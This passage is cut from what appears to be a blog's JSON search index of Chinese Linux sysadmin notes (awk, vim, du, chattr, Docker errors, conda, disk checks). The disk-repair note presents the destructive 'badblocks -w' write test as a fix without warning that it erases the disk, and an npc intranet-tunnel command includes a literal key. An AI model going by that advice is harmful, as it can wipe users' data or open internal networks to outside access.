ms","categories":[{"name":"linux网络","slug":"linux网络","permalink":"http://example.com/categories/linux%E7%BD%91%E7%BB%9C/"}],"tags":[{"name":"ping","slug":"ping","permalink":"http://example.com/tags/ping/"},{"name":"tcping","slug":"tcping","permalink":"http://example.com/tags/tcping/"}]},{"title":"npc内网穿透","slug":"内网穿透","date":"2021-06-24T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/06/25/内网穿透/","permalink":"http://example.com/2021/06/25/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/","excerpt":"","text":"C:\\NPS&gt;npc.exe -server&#x3D;XX.XX.XX.XX:XXXX -vkey&#x3D;zmo83rtp -type&#x3D;tcp","categories":[{"name":"内网穿透","slug":"内网穿透","permalink":"http://example.com/categories/%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/"}],"tags":[{"name":"npc","slug":"npc","permalink":"http://example.com/tags/npc/"}]},{"title":"创建虚拟网卡 vlan macvlan","slug":"macvlan","date":"2021-06-23T16:00:00.000Z","updated":"2021-11-12T07:59:22.000Z","comments":true,"path":"2021/06/24/macvlan/","permalink":"http://example.com/2021/06/24/macvlan/","excerpt":"","text":"创建vlan1ip link add link $interface name $interface.$vlanid type vlan id $vlanid 创建macvlan1link add link $interface dev $macv_name type macvlan mode private 注:这两种方法创建的网卡，在机器在重启后会被清空 如何在 CentOS&#x2F;RHEL 系统中使用带 VLAN 标记的以太网卡","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"vlan网卡","slug":"vlan网卡","permalink":"http://example.com/tags/vlan%E7%BD%91%E5%8D%A1/"}]},{"title":"shell脚本自增","slug":"shell脚本自增","date":"2021-06-16T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/06/17/shell脚本自增/","permalink":"http://example.com/2021/06/17/shell%E8%84%9A%E6%9C%AC%E8%87%AA%E5%A2%9E/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031#!/bin/sh#本脚本测试shell脚本中整型变量自增 加1的几种方法 #定义整型变量a=1echo $a #第一种整型变量自增方式a=$(($a+1))echo $a #第二种整型变量自增方式a=$[$a+1]echo $a #第三种整型变量自增方式a=`expr $a + 1`echo $a #第四种整型变量自增方式let a++echo $a #第五种整型变量自增方式let a+=1echo $a #第六种整型变量自增方式((a++))echo $a","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"自增","slug":"自增","permalink":"http://example.com/tags/%E8%87%AA%E5%A2%9E/"}]},{"title":"利用环境变量IFS自定义分隔符","slug":"环境变量IFS","date":"2021-06-16T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/06/17/环境变量IFS/","permalink":"http://example.com/2021/06/17/%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8FIFS/","excerpt":"","text":"12345678910111213$ cat test.txt apple pear banana orange $ cat test.sh#!/bin/bashifs_old=$IFSIFS=$&#x27;\\n&#x27;for val in `cat test.txt`do echo &quot;n=$val&quot;doneIFS=$ifs_old$ ./test.shn=apple pear banana orange","categories":[{"name":"shell","slug":"shell","permalink":"http://example.com/categories/shell/"}],"tags":[{"name":"IFS","slug":"IFS","permalink":"http://example.com/tags/IFS/"}]},{"title":"linux磁盘坏道的检测和修复","slug":"linux磁盘坏道","date":"2021-06-03T16:00:00.000Z","updated":"2021-09-09T03:19:10.000Z","comments":true,"path":"2021/06/04/linux磁盘坏道/","permalink":"http://example.com/2021/06/04/linux%E7%A3%81%E7%9B%98%E5%9D%8F%E9%81%93/","excerpt":"","text":"如何检测磁盘坏道 使用dmesg检查是否有关于磁盘错误的信息，果不其然发现大量磁盘扇区错误的信息，如下： end_request: I&#x2F;O error, dev 03:06 (sda), sector dmesg命令 被用于检查和控制内核的环形缓冲区。kernel会将开机信息存储在ring buffer中。您若是开机时来不及查看信息，可利用dmesg来查看。开机信息保存在&#x2F;var&#x2F;log&#x2F;dmesg文件里。 使用badblocks -s -v -o &#x2F;root&#x2F;badblocks.log &#x2F;dev&#x2F;sda 检查硬盘是否产生坏道并输出到badblocks.log中。log大约是这样的模式：164039224 64039240 64039241 64039242 64039243 64039256 64039257 64039258 64039259 687056 可修复修复坏道修复方法：1 使用 badblocks -s -w &#x2F;dev&#x2F;sda END START END代表需要修复的扇区末端，START代表需要修复的扇区起始端。2 使用fsck -a &#x2F;dev&#x2F;sda1 磁盘坏道分为三种 0磁道坏道0磁道坏道的修复方法是隔离0磁道，使用fdsk划分区的时候从1磁道开始划分区 逻辑坏道逻辑坏道可以使用上面的方法修复 硬盘坏道如果是硬盘坏道的话，只能隔离不能修复 硬盘坏道的监测方法：使用上述方法检测修复后，再使用badblocks -s -v -o /root/badblocks.log /dev/sda监测看是否还有坏道存在，如果坏道还是存在的话说明坏道属于硬盘坏道。硬盘坏道隔离方法，首先记录监测出的硬盘坏道，然后分区的时候把硬盘坏道所在的扇区分在一个分区（大小一般大于坏扇区大小），划分出的坏道分区不使用即可达到隔离的目的。隔离只是暂时方案，建议尽快更换硬盘，因为坏道会扩散，以免以后出现严重的数据问题","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"磁盘坏道","slug":"磁盘坏道","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E5%9D%8F%E9%81%93/"}]},{"title":"python安装face_recognition和dlib","slug":"python安装face_recognition和dlib","date":"2021-05-05T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/05/06/python安装face_recognition和dlib/","permalink":"http://example.com/2021/05/06/python%E5%AE%89%E8%A3%85face_recognition%E5%92%8Cdlib/","excerpt":"","text":"在是用机器学习的时候总会用到dlib库，万恶的win总是搞事情（虽然lin在其他地方也搞事情），废话不多说，下面是我的解决方法使用Anaconda对python进行版本控制，说人话就是虚拟个环境，跟linux里的virtualenv差不多 安装最新版的Anaconda（也没得选，就这一个） anaconda中内置了一个用来管理包的工具叫做： conda，类似python的pip，arch中的pacman. 虚拟一个python 3.6的环境（亲测可行） 123456conda create -n $环境名 python=3.6 tensorflow ipython进入环境conda activate $环境名退出环境conda deactivate 需要注意的是，在安装的时候，可能会报下面这个错。这是表示，可以下载的地方(channels)太多了，求求你挑一个把。显然这么多的地方，鬼知道哪个好使，有个默认的就好了。配置一下即可 123456789101112# 尝试使用此命令将conda-forge通道添加到通道列表中# 它告诉conda 在搜索包时也会查看conda-forge通道,也就是列出来的那些额外channel。# 然后你可以简单地安装dlib，管它从哪里下载呢!# 查看anaconda show conda-forge/dlib# 配置conda config --append channels conda-forge# 安装dlibconda install dlib# 安装face_recognitionconda install face_recognition conda的一些命令查看已经安装过的镜像conda config --show 删除镜像conda config --remove channels $url 添加镜像conda config --add channels https://mirrors.ustc.edu.cn/anaconda/pkgs/free/ 清除索引缓存，保证用的是镜像站提供的索引conda clean -i Windows 用户无法直接创建名为 .condarc 的文件，可先执行 conda config --set show_channel_urls yes 生成该文件之后再修改。 conda的配置文件在C:\\Users\\用户\\.condarc中(windows) 显示环境信息conda info 升级condaconda update -n base -c defaults conda 查看包的版本信息anaconda show conda-forge/dlib 查看某个安装包的依赖项 1conda search XXX -info","categories":[{"name":"python","slug":"python","permalink":"http://example.com/categories/python/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"版本兼容","slug":"版本兼容","permalink":"http://example.com/tags/%E7%89%88%E6%9C%AC%E5%85%BC%E5%AE%B9/"}]},{"title":"docker容器启动失败","slug":"docker容器异常","date":"2021-04-29T16:00:00.000Z","updated":"2022-02-08T08:23:40.000Z","comments":true,"path":"2021/04/30/docker容器异常/","permalink":"http://example.com/2021/04/30/docker%E5%AE%B9%E5%99%A8%E5%BC%82%E5%B8%B8/","excerpt":"","text":"错误一报错信息docker:Error response from daemon:endpoint with name monitor already exists in network host. 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849# docker infoClient: Debug Mode: falseServer: Containers: 250 Running: 250 Paused: 0 Stopped: 0 Images: 5 Server Version: 19.03.8 Storage Driver: overlay2 Backing Filesystem: &lt;unknown&gt; Supports d_type: true Native Overlay Diff: true Logging Driver: json-file Cgroup Driver: cgroupfs Plugins: Volume: local Network: bridge host ipvlan macvlan null overlay Log: awslogs fluentd gcplogs gelf journald json-file local logentries splunk syslog Swarm: inactive Runtimes: runc Default Runtime: runc Init Binary: docker-init containerd version: 7ad184331fa3e55e52b890ea95e65ba581ae3429 runc version: dc9208a3303feef5b3839f4323d9beb36df0a9dd init version: fec3683 Security Options: seccomp Profile: default Kernel Version: 5.5.11-1.el7.elrepo.x86_64 Operating System: CentOS Linux 7 (Core) OSType: linux Architecture: x86_64 CPUs: 48 Total Memory: 125.9GiB Name: d1a1e70b5f676226cb7ee2de95a79f79 ID: V64J:KRRC:C6OI:PR2F:BIKW:XF26:YGPE:O2FW:B6NE:XASJ:TQMM:FUA7 Docker Root Dir: /var/lib/docker Debug Mode: false Registry: https://index.docker.io/v1/ Labels: Experimental: false Insecure Registries: 127.0.0.0/8 Live Restore Enabled: false 解决方法重启docker或者重启机器 12docker network inspect &lt;network name&gt;docker network disconnect &lt;network name&gt; &lt;container id/ container name&gt; 12docker network disconnect --force bridge monitor(这个好像也可以) 错误二Error response from daemon:chown &#x2F;etc&#x2F;resolv.conf:operation not permitted 看报错是权限不足，ls -l /etv/resolv.conf,权限也没问题有可能曾经用chattr命令锁定该文件了查看文件权限 12$ lsattr /etc/resolv.conf----i----------- /etc/resolv.conf i：设定文件不能被删除、改名、设定链接关系，同时不能写入或新增内容。 移除权限就可以了 1$ chattr -i resolv.conf 错误四container_linux.go:349: starting container process caused “process_linux.go:297: 12# docker start a929869eecf0Error response from daemon: OCI runtime create failed: container_linux.go:349: starting container process caused &quot;process_linux.go:297: applying cgroup configuration for process caused \\&quot;failed to write 1 to memory.kmem.limit_in_bytes: write /sys/fs/cgroup/memory/kubepods/pod8811d42e-5e5e-11ec-b5c1-3e46384a3f85/a929869eecf0178555180396c57ea19a7f79298224ea0b5265c2585e6623a457/memory.kmem.limit_in_bytes: operation not supported\\&quot;&quot;: unknown 123# cd /sys/fs/cgroup/memory/kubepods/pod8811d42e-5e5e-11ec-b5c1-3e46384a3f85# mv 71de757cc45ec758615c2d06f335e47610327ba48824a02d0aa57e9c66b88d8c a929869eecf0178555180396c57ea19a7f79298224ea0b5265c2585e6623a457 容器启动过程中需要对某个文件进行读写，报错提示：操作不支持，应为该路径下没有这个文件，docker run里的文件名不对 解决方法，将机器上的文件名修改成docker run里的文件名 参考https://www.cnblogs.com/yjt1993/p/13223897.html","categories":[{"name":"服务器容器","slug":"服务器容器","permalink":"http://example.com/categories/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%AE%B9%E5%99%A8/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"报错解决","slug":"报错解决","permalink":"http://example.com/tags/%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3/"}]},{"title":"CentOS7 出現 slice User 信息的解法","slug":"CentOS7出現 slice User信息的解法","date":"2021-04-28T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/29/CentOS7出現 slice User信息的解法/","permalink":"http://example.com/2021/04/29/CentOS7%E5%87%BA%E7%8F%BE%20slice%20User%E4%BF%A1%E6%81%AF%E7%9A%84%E8%A7%A3%E6%B3%95/","excerpt":"","text":"CentOS 7 的 &#x2F;var&#x2F;log&#x2F;messages 系統紀錄內會大量出現 slice User 的訊息如下: 12345678910Aug 18 08:34:49 ct-squid systemd: Removed slice User Slice of root.Aug 18 09:30:01 ct-squid systemd: Created slice User Slice of root.Aug 18 09:30:01 ct-squid systemd: Started Session c616 of user root.Aug 18 09:41:07 ct-squid systemd: Removed slice User Slice of root.Aug 18 10:30:01 ct-squid systemd: Created slice User Slice of root.Aug 18 10:30:01 ct-squid systemd: Started Session c617 of user root.Aug 18 10:36:28 ct-squid systemd: Removed slice User Slice of root.Aug 18 10:54:22 ct-squid systemd: Created slice User Slice of root.Aug 18 10:54:22 ct-squid systemd: Started Session 33128 of user root.Aug 18 10:54:22 ct-squid systemd-logind: New session 33128 of user root. 主要的原因是和 systemd 服務有關, 可以透過紀錄篩選規則設定, 來隱藏這些 slice User 訊息, 設定方式如下: 12echo &#x27;if $programname == &quot;systemd&quot; and ($msg contains &quot;Starting Session&quot; or $msg contains &quot;Started Session&quot; or $msg contains &quot;Created slice&quot; or $msg contains &quot;Starting user-&quot; or $msg contains &quot;Starting User Slice of&quot; or $msg contains &quot;Removed session&quot; or $msg contains &quot;Removed slice User Slice of&quot; or $msg contains &quot;Stopping User Slice of&quot;) then stop&#x27; &gt;/etc/rsyslog.d/ignore-systemd-session-slice.confsystemctl restart rsyslog","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"centos7","slug":"centos7","permalink":"http://example.com/tags/centos7/"},{"name":"slice User","slug":"slice-User","permalink":"http://example.com/tags/slice-User/"}]},{"title":"linux磁盘挂载","slug":"磁盘挂载","date":"2021-04-28T16:00:00.000Z","updated":"2022-06-15T09:28:38.000Z","comments":true,"path":"2021/04/29/磁盘挂载/","permalink":"http://example.com/2021/04/29/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/","excerpt":"","text":"查看磁盘的uuid123命令查看：blkid文件查看：ls -l /dev/disk/by-uuid命令查看：vol_id /dev/sda1 检测磁盘有没有损坏通过hdparm 测试硬盘读写速度的方法 测试各硬盘读取速度判断硬盘故障 12345hdparm -t /dev/hda (IDE硬盘)hdparm -t /dev/sda (SATA、SCSI、硬RAID卡阵列)hdparm -t /dev/md0 (软RAID设备) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657参 数：-a 设定读取文件时，预先存入块区的分区数，若不加上选项，则显示目前的设定。-A&lt;0或1&gt; 启动或关闭读取文件时的快取功能。-c 设定IDE32位I/O模式。-C 检测IDE硬盘的电源管理模式。-d&lt;0或1&gt; 设定磁盘的DMA模式。-f 将内存缓冲区的数据写入硬盘，并清楚缓冲区。-g 显示硬盘的磁轨，磁头，磁区等参数。-h 显示帮助。-i 显示硬盘的硬件规格信息，这些信息是在开机时由硬盘本身所提供。-I 直接读取硬盘所提供的硬件规格信息。-k&lt;0或1&gt; 重设硬盘时，保留-dmu参数的设定。-K&lt;0或1&gt; 重设硬盘时，保留-APSWXZ参数的设定。-m 设定硬盘多重分区存取的分区数。-n&lt;0或1&gt; 忽略硬盘写入时所发生的错误。-p 设定硬盘的PIO模式。-P 设定硬盘内部快取的分区数。-q 在执行后续的参数时，不在屏幕上显示任何信息。-r&lt;0或1&gt; 设定硬盘的读写模式。-S 设定硬盘进入省电模式前的等待时间。-t 评估硬盘的读取效率。-T 平谷硬盘快取的读取效率。-u&lt;0或1&gt; 在硬盘存取时，允许其他中断要求同时执行。-v 显示硬盘的相关设定。-W&lt;0或1&gt; 设定硬盘的写入快取。-X 设定硬盘的传输模式。-y 使IDE硬盘进入省电模式。-Y 使IDE硬盘进入睡眠模式。-Z 关闭某些Seagate硬盘的自动省电功能 硬盘是否为移动u盘1/sys/block/sdc/removable USB&#x3D;”” 1为可移动，0为不可移动","categories":[{"name":"Linux磁盘","slug":"Linux磁盘","permalink":"http://example.com/categories/Linux%E7%A3%81%E7%9B%98/"}],"tags":[{"name":"磁盘挂载","slug":"磁盘挂载","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E6%8C%82%E8%BD%BD/"},{"name":"磁盘解挂","slug":"磁盘解挂","permalink":"http://example.com/tags/%E7%A3%81%E7%9B%98%E8%A7%A3%E6%8C%82/"}]},{"title":"chattr与lsattr命令","slug":"charrt与lsattr命令","date":"2021-04-26T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/27/charrt与lsattr命令/","permalink":"http://example.com/2021/04/27/charrt%E4%B8%8Elsattr%E5%91%BD%E4%BB%A4/","excerpt":"","text":"有时候你发现用root权限都不能修改某个文件，大部分原因是曾经用chattr命令锁定该文件了。通过chattr命令修改属性能够提高系统的安全性，但是它并不适合所有的目录。chattr命令不能保护&#x2F;、&#x2F;dev、&#x2F;tmp、&#x2F;var目录。lsattr命令是显示chattr命令设置的文件属性。 这两个命令是用来查看和改变文件、目录属性的，与chmod这个命令相比，chmod只是改变文件的读写、执行权限，更底层的属性控制是由chattr来改变的。 chattr修改文件在Linux第二扩展文件系统(E2fs)上的特有属性chattr [ -RVf ] [ -v version ] [ mode ] files…[ mode ]部分是由+-&#x3D;和[ ASacDdIijsTtu ]这些字符组合的，这部分是用来控制文件的属性。 -R 递归地修改目录以及其下内容的属性. 如果在递归目录时遇到了符号链接,遍历将跳过-V 详尽地给出chattr的输出信息并打印出程序的版本-vversion 设置文件系统的版本 操作符+用来在文件已有属性的基础上增加选定的属性; -用来去掉文件上的选定的属性;而=用来指定该文件的唯一属性 字符&#96;ASacdisu’用作文件新属性的选项: 不更新atime(A),同步更新(S),只能添加(a), 压缩(c),不可变(i),不可转移(d),删除保护(s)以及不可删除(u) 123$ chattr -i resolv.conf$ chattr +a /var/log/messages #让某个文件只能往里面追加数据，但不能删，适合日志文件 12345678当修改设置了&#x27;A&#x27;属性的文件时,它的atime记录不会改变. 这可以在笔记本电脑系统中避免某些磁盘I/O处理.设置了`a&#x27;属性的文件只能在添加模式下打开用于写入. 只有超级用户可以设置或清除该属性.设置了`c&#x27;属性的文件在磁盘上由内核自动进行压缩处理. 从该文件读取时返回的是未压缩的数据. 对该文件的一次写入会在保存它们到磁盘之前进行数据压缩.设置了`d&#x27;属性的文件不能对其运行 dump(8) 程序进行备份.设置了`i&#x27;属性的文件不能进行修改:你既不能删除它, 也不能给它重新命名,你不能对该文件创建链接, 而且也不能对该文件写入任何数据. 只有超级用户可以设置或清除该属性.当删除设置了`s&#x27;属性的文件时,将对其数据块清零 并写回到磁盘上.当修改设置了`S&#x27;属性的文件时, 修改会同步写入到磁盘上;这与应用 到文件子系统上的`sync&#x27;挂载选项有相同的效果.当删除设置了`u&#x27;属性的文件时, 将会保存其内容. 这使得用户可以请求恢复被删除的文件. lsattr-R 递归地列出目录以及其下内容的属性-V 显示程序版本-a 列出目录中的所有文件,包括以&#96;.’开头的文件的属性-d 以列出其它文件的方式那样列出目录的属性, 而不列出其下的内容-v 显示文件版本 12$ lsattr /etc/resolv.conf----i----------- /etc/resolv.conf","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"},{"name":"文件权限","slug":"文件权限","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%9D%83%E9%99%90/"}]},{"title":"du查看文件或文件夹的大小","slug":"du命令","date":"2021-04-26T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/27/du命令/","permalink":"http://example.com/2021/04/27/du%E5%91%BD%E4%BB%A4/","excerpt":"","text":"语法 1du [-abcDhHklmsSx][-L &lt;符号连接&gt;][-X &lt;文件&gt;][--block-size][--exclude=&lt;目录或文件&gt;][--max-depth=&lt;目录层数&gt;][--help][--version][目录或文件] 例子 查看当前目录总共占的容量，而不单独列出各子项占用的容量 12$ du -sh15G 查看当前目录下一级子文件和子目录占用的磁盘容量 123456$ du -lh --max-depth=113M ./.cache0 ./.config1.2M ./mongo-hacker0 ./.pki14M . 查看指定文件大小可以使用du -sh或du -a 12$ du -sh check_vdpppoe.sh4.0K check_vdpppoe.sh 列出当前目录中的目录名不包括某字符串的目录的总大小 12$ u -sh --exclude=&quot;check_vdpppoe.sh&quot;24K . 123456789101112131415161718192021222324252627282930313233343536常用参数说明：-a或-all 显示目录中个别文件的大小。-b或-bytes 显示目录或文件大小时，以byte为单位。-c或--total 除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和。-D或--dereference-args 显示指定符号连接的源文件大小。-h或--human-readable 以K，M，G为单位，提高信息的可读性。-H或--si 与-h参数相同，但是K，M，G是以1000为换算单位。-k或--kilobytes 以1024 bytes为单位。-l或--count-links 重复计算硬件连接的文件。-L&lt;符号连接&gt;或--dereference&lt;符号连接&gt; 显示选项中所指定符号连接的源文件大小。-m或--megabytes 以1MB为单位。-s或--summarize 仅显示总计。-S或--separate-dirs 显示个别目录的大小时，并不含其子目录的大小。-x或--one-file-xystem 以一开始处理时的文件系统为准，若遇上其它不同的文件系统目录则略过。-X&lt;文件&gt;或--exclude-from=&lt;文件&gt; 在&lt;文件&gt;指定目录或文件。--exclude=&lt;目录或文件&gt; 略过指定的目录或文件。--max-depth=&lt;目录层数&gt; 超过指定层数的目录后，予以忽略。--help 显示帮助。--version 显示版本信息。","categories":[{"name":"linux","slug":"linux","permalink":"http://example.com/categories/linux/"}],"tags":[{"name":"技巧","slug":"技巧","permalink":"http://example.com/tags/%E6%8A%80%E5%B7%A7/"}]},{"title":"awk命令","slug":"awk命令","date":"2021-04-22T16:00:00.000Z","updated":"2022-09-28T09:34:36.000Z","comments":true,"path":"2021/04/23/awk命令/","permalink":"http://example.com/2021/04/23/awk%E5%91%BD%E4%BB%A4/","excerpt":"","text":"使用awk命令获取文本的某一行，某一列123456789101112131415161718打印文件的第一列awk &#x27;&#123;print $1&#125;&#x27; filename打印文件的前两列awk &#x27;&#123;print $1,$2&#125;&#x27; filename打印完第一列，然后打印第二列awk &#x27;&#123;print $1 $2&#125;&#x27; filename打印文本文件的总行数awk &#x27;END&#123;print NR&#125;&#x27; filename打印文本第一行awk &#x27;NR==1&#123;print&#125;&#x27; filename打印文本第二行第一列sed -n &quot;2, 1p&quot; filename | awk &#x27;print $1&#x27; awk分隔符12345678910$ cat testa#b#c#d$ awk -F# &#x27;&#123;print $1,$2&#125;&#x27; testa b$ awk -v FS&#x27;#&#x27; &#x27;&#123;print $1,$2&#125;&#x27; testa bawk内置变量FS可以用于指定输入分隔符，但是在使用变量时，需要使用-v选项，用于指定对应的变量，比如 -v FS=’# 输出分隔符awk输出每一列的时候，会使用空格隔开每一列，其实，这个空格，就是awk的默认的输出分隔符可以使用awk的内置变量OFS来设定awk的输出分隔符，当然，使用变量的时候要配合使用-v选项 123456789101112awk -v FS=&quot;#&quot; -v OFS=&#x27;----&#x27; &#x27;&#123;print $1,$2&#125;&#x27; testa----b默认输出分隔符为空格awk &#x27;&#123;print $1,$2&#125;&#x27; testa bawk &#x27;&#123;print $1$2&#125;&#x27; testabawk &#x27;&#123;print $1 $2&#125;&#x27; testab NF的意思123NF 是一个预定义的变量，其值为当前记录中的字段数。 awk 每次读取记录时都会自动更新 NF 的值。 无论有多少个字段，记录中的最后一个字段都可以用 $NF 表示 查找123456789# cat ma 91b 42c 33d 14e 21# awk &#x27;/a/ &#123;print $0&#125;&#x27; ma 91 打印某列以后的所有列1234567891011121314151617181920212223# cat ma 91 sa fdb 42 sa fdc 33 sa fdd 14 sa fde 21 sa fd# awk &#x27;&#123; $1=&quot;&quot;; print $0 &#125;&#x27; m 91 sa fd 42 sa fd 33 sa fd 14 sa fd 21 sa fd注：第一列会全部替换为空格以此类推，如果我要打印某列以后的所有列的，可以使用循环把，把前N列都赋值为空# awk &#x27;&#123; for(i=1; i&lt;=3; i++)&#123; $i=&quot;&quot; &#125;; print $0 &#125;&#x27; m fd fd fd fd fd awk输入输出分隔符1234567891011awk默认从STDIN接受数据，打印文本到STDOUT。awk的默认输入和输出分隔符：FS : 输入字段分隔符，默认空格。RS : 输入行分隔符，默认\\n。OFS : 输出字段分隔符，默认空格。ORS : 输出行分隔符，默认\\n。 区分shell函数的参数1234567891011121314# echo a,s,d,f |awk &#x27;BEGIN&#123;FS=&quot;,&quot;; OFS=&quot;&quot;; ORS=&quot;&quot;&#125;&#123;for(x=1;x&lt;=NF;x++)&#123;print $x&quot;\\n&quot;&#125;&#125;&#x27;asdf# for i in `echo a,s,d,f |awk &#x27;BEGIN&#123;FS=&quot;,&quot;; OFS=&quot;&quot;; ORS=&quot;&quot;&#125;&#123;for(x=1;x&lt;=NF;x++)&#123;print $x&quot;\\n&quot;&#125;&#125;&#x27;`;do echo $i;doneasdf 去掉重复行12345awk &#x27;!a[$0]++&#x27; file或者sort file | uniq 解析 提取文本最后一行123awk &#x27;END &#123;print&#125;&#x27;awk &#x27;&#123;b=a&quot;\\n&quot;$0;a=$0&#125;END&#123;print b&#125;&#x27; 提取两个括号之间的内容1awk &#x27;BEGIN&#123;FS=&quot;[()]&quot;&#125;&#123;print $2&#125;&#x27; awk的输出格式控制：print 和printf123printf更加自由化，一切输出格式都需要自己定义。print是定义好的printf，通过内部变量能改变已经定义好的格式。 printf的用法： 格式：printf “格式化”，变量1，变量2 格式化内容： 123456789101112131415161718192021221.数据格式 十进制整数：%d 科学计数法显示数字：%e 浮点数：%f 字符串：%s ASCII码：%c2.换行，空格等 换行：\\n 空格：\\t3.对齐 左对齐：“-”，默认右对齐。 计算2个数值的百分比123456a=20b=100#计算百分比 echo `awk &#x27;BEGIN&#123;printf &quot;%.1f%%\\n&quot;,(&#x27;$a&#x27;/&#x27;$b&#x27;)*100&#125;&#x27;`20.0% 在shell中统计某字符串的个数 通过使用grep查找命令 1$ grep -o &#x27;字符串&#x27; file | wc -l 通过使用awk命令进行统计 1$ awk -v RS=&quot;@#$j&quot; &#x27;&#123;print gsub(/字符串/,&quot;&amp;&quot;)&#125;&#x27; file 使用awk命令的另一种方式 1$ awk &#x27;&#123;s+=gsub(/字符串/,&quot;&amp;&quot;)&#125;END&#123;print s&#125;&#x27; file","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"awk","slug":"awk","permalink":"http://example.com/tags/awk/"}]},{"title":"paste命令","slug":"paste命令","date":"2021-04-22T16:00:00.000Z","updated":"2021-08-23T02:19:00.000Z","comments":true,"path":"2021/04/23/paste命令/","permalink":"http://example.com/2021/04/23/paste%E5%91%BD%E4%BB%A4/","excerpt":"","text":"paste：合并拼接文件例子 1234567891011121314151617$ cat p1.txt123$ cat p2.txtabc$ paste p1.txt p2.txt1 a2 b3 cpaste使用了制表符(Tab)作为间隔符三个文件也可以拼接，paste 拼接和文件列表的顺序有关 paste默认的拼接符是tab,可以使用-d选项就可以设定间隔符 12345$ paste -d &#x27;*&#x27; p2.txt p1.txta*1b*2c*3 要注意一点，此处一定要把星号用引号括起来（单引号双引号均可），否则 Shell 会把星号扩展为当前目录下的文件列表，千万小心。 paste 命令的 -s 选项看以下例子更容易懂一些 1234567891011121314151617181920$ cat p1.txt123$ cat p2.txtabc$ cat p3.txtIIIIII$ paste -s -d &quot;*&quot; p1.txt p2.txt p3.txt1*2*3a*b*cI*II*III","categories":[{"name":"文本","slug":"文本","permalink":"http://example.com/categories/%E6%96%87%E6%9C%AC/"}],"tags":[{"name":"paste","slug":"paste","permalink":"http://example.com/tags/paste/"}]},{"title":"vim命令","slug":"vim命令","date":"2021-04-22T16:00:00.000Z","updated":"2022-04-27T08:13:36.000Z","comments":true,"path":"2021/04/23/vim命令/","permalink":"http://example.com/2021/04/23/vim%E5%91%BD%E4%BB%A4/","excerpt":"","text":"删除每行后10个字符（替换+正则匹配到每行后10给字符）:%s&#x2F;.{10}$&#x2F;&#x2F;删除每行后10个字符:%s&#x2F;^.{10}&#x2F;&#x2F; \\n匹配行尾（换行符），而\\r匹配回车符。另一方面，在替换中\\n插入空字符，而\\r插入换行符（更准确地说，它被视为输入 ）。这是一个小的非交互式示例，使用 Vim 命令行功能来说明这一点（换句话说，您可以将以下内容复制并粘贴到终端中以运行它）。 xxd显示结果文件的 hexdump。 12345echo bar &gt; test(echo &#x27;Before:&#x27;; xxd test) &gt; output.txtvim test &#x27;+s/b/\\n/&#x27; &#x27;+s/a/\\r/&#x27; +wq(echo &#x27;After:&#x27;; xxd test) &gt;&gt; output.txtmore output.txt 1234Before:0000000: 6261 720a bar.After:0000000: 000a 720a ..r. 换句话说， \\n已将字节 0x00 插入到文本中; \\r已插入字节 0x0a。 删除空行可以使用 :%g&#x2F;^$&#x2F;d 命令来删除只有一个换行符的空行 复制:copy 命令 (缩写形式 :co，或 :t) 1234:3,5t. 把第 3 行到第 5 行的内容复制到当前行下方:t5 把当前行复制到第 5 行下方:t$ 把当前行复制到文本结尾:&#x27;&lt;,&#x27;&gt;t0 把高亮选中的行复制到文件开头 移动:move 命令 (缩写形式为 :m) TAB替换为空格：:set ts&#x3D;4 折叠set foldmethod&#x3D;indent 12345678910111213za 打开/关闭当前的折叠zc 关闭当前打开的折叠zo 打开当前的折叠zm 关闭所有折叠zM 关闭所有折叠及其嵌套的折叠zr 打开所有折叠zR 打开所有折叠及其嵌套的折叠zd 删除当前折叠zE 删除所有折叠zj 移动至下一个折叠zk 移动至上一个折叠zn 禁用折叠zN 启用折叠 显示不可见字符12345678:set invlist 例如，会以^I表示一个tab符，$表示一个回车符等。也可以:%!cat -A在Vim中调用cat转换显示或者直接cat -A file QuickFix列表使用某些vim命令，将会使用QuickFix列表在不同文件的不同位置间导航。 例如：使用:make命令进行编译时，遍历编译错误；使用:vimgrep命令进行搜索时，遍历匹配结果；使用:helpgrep命令查找帮助信息时，遍历匹配 12345678910111213141516:vimgrep options *.html打开QuickFix窗口:copen关闭QuickFix窗口:cclose:cnext移动到下一个匹配处:cprevious移动到上一个匹配处:cfirst移动到第一个匹配处:clast移动到最后一个匹配处 vim窗口 参考链接1 替换^m字符12这里的 ^M 要使用 CTRL-V CTRL-M 